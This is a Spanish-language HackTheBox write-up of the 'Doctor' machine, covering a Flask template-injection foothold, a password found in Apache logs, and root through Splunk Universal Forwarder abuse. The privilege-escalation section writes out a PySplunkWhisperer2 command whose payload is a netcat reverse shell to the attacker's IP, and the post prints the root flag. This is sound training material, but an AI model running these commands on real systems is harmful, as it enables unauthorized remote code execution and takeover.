---
layout: post
title: Write-Up Máquina Doctor HTB
date: 2021-01-30 16:00 +0800
last_modified_at: 2021-01-30 16:10 +0800
tags: [htb, writeup, linux, splunk, ssti]
toc:  true
---

![Doctor-info-card](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-info-card.png)

## Introducción

La máquina doctor, Es una máquina de dificultad fácil la cual corre un sistema linux de 64 bits. Para explotar esta máquina vamos utilizar una [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection) para obtener una reverse shell inicial. Una vez obtenida encontraremos una password que nos servirá para obtener el usuario. Para la escalada de privilegios, explotaremos el servicio splunk con las credenciales del usuario shaun.

---
## Escaneo

```bash
nmap  10.10.10.209 -p- -sV -sC --min-rate=5000                                                                                    

Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 15:02 CET
Nmap scan report for doctor.htb (10.10.10.209)
Host is up (0.031s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.70 seconds
```
Esta máquina tiene 3 puertos abiertos:
* Puerto 22: SSH
* Puerto 80: HTTPd (apache)
* Puerto 8089: HTTP (Splunk)


### Puerto 22
En el puerto 22 Nos encontramos con el un servidor SSH.

### Puerto 80
En el puerto 80, nos encontramos con un servidor web apache. En este caso si accedemos a través de la IP nos encontramos con una pagina estática. En ella podemos ver un correo con un dominio. 

![Doctor-email](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-email.png)

### Puerto 8089
En el puerto 8089, nos encontramos con un servidor de splunk.

---
## Enumeración

Si añadimos el dominio doctors.htb y accedemos al la web, nos encontramos con una pagina de login, la cual tiene una opción para registrar una cuenta.

![Doctor-login](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-login.png)

Vamos a registrar una cuenta y accedemos a la web principal. Una vez ahi se nos da la opción de postear un nuevo mensaje.

Vamos a postear un mensaje nuevo.

![Doctor-new-message](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-new-message.png)
![Doctor-posted-message](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-posted-message.png)

Vemos que podemos ver los mensajes que escribimos. Si vamos a view-source:http://doctors.htb/archive vemos que el título de el post aparece reflejado. Esto es indicativo de un posible server-side template injection.

---
## Explotación

Para la explotación vamos a crear un nuevo post con nuestro payload en el título, ya que es el título  lo que se refleja.

En este caso el payload va a ser una reverse shell en python, ya que el backend de la página es una implementación de flask.
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

En este caso nuestro payload sera el siguiente:

![Doctor-payload-ssti](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-payload-ssti.png)



Una vez creemos el post nuevo accederemos a http://doctors.htb/archive recibiremos nuestra reverse en el puerto 1234.

![Doctor-reverse-shell](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-reverse-shell.png)

Ya que tenemos una reverse shell, vamos a enumerar la maquina en busca de pistas para obtener el usuario. Para esto vamos a subir el script de [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) y vamos a enumerar la máquina.

```log
[+] Finding passwords inside logs (limit 70)
Binary file /var/log/apache2/access.log.12.gz matches
Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001.journal matches
Binary file /var/log/kern.log.2.gz matches
Binary file /var/log/kern.log.4.gz matches
Binary file /var/log/syslog.4.gz matches
/var/log/apache2/access.log:10.10.14.29 - - [04/Feb/2021:15:51:36 +0100] "GET /reset_password HTTP/1.1" 200 1812 "-" "gobuster/3.0.1"
/var/log/apache2/access.log:10.10.14.29 - - [04/Feb/2021:16:39:18 +0100] "GET /reset_password HTTP/1.1" 200 1811 "-" "gobuster/3.0.1"
/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
/var/log/auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
/var/log/auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
/var/log/auth.log.1:Sep 23 15:38:45 doctor sudo:    shaun : command not allowed ; TTY=tty1 ; PWD=/home/shaun ; USER=root ; COMMAND=list
/var/log/auth.log.1:Sep 28 13:31:10 doctor sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/setcap -r /usr/bin/python3/
```

Vemos que en uno de los logs hay una contraseña y también se hace referencia al usuario shaun.

Vamos entonces a probar las credenciales:
* username: shaun
* password: Guitar123

```bash
web@doctor:/tmp$ su shaun
su shaun
Password: Guitar123

id
uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
```
Como podemos ver ya somos usuario shaun y por tanto podemos ver la flag.

![Doctor-flag-user](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-flag-user.png)

---
## Escalada de privilegios

Al principio, vimos que la máquina tenia levantado un servidor de splunk en el puerto 8089. Si vamos a la URL https://10.10.10.209:8089/services nos pedirá unas credenciales. Ya que tenemos credenciales para el usuario shaun, vamos a probarlas.

![Doctor-services-splunk](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-services-splunk.png)

Como podemos comprobar tenemos acceso y las credenciales son validas. Una vez sabemos esto, vamos a buscar la forma de ejecutar comandos. 

Para este caso encontré una herramienta en github la cual nos permite de manera remota ejecutar una escalada de privilegios a traves de malas configuraciones en el [splunk universal forwarder](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/).

```bash
python3 PySplunkWhisperer2_remote.py --host doctors.htb --port 8089 --lhost 10.10.14.29 --user shaun --password Guitar123 --payload "nc.traditional -e /bin/bash '10.10.14.29' 1111"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpmj9na35k.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.29:8181/
10.10.10.209 - - [04/Feb/2021 19:59:20] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup
```
![Doctor-root-check](/assets/imagenes/2021-02-06-doctor-HTB/Doctor-root-check.png)

como podemos ver, recibimos la reverse shell y ya somos root.

```
cat /root/root.txt
76373cb2c7aee0a7cfb9c284801cd62b
```


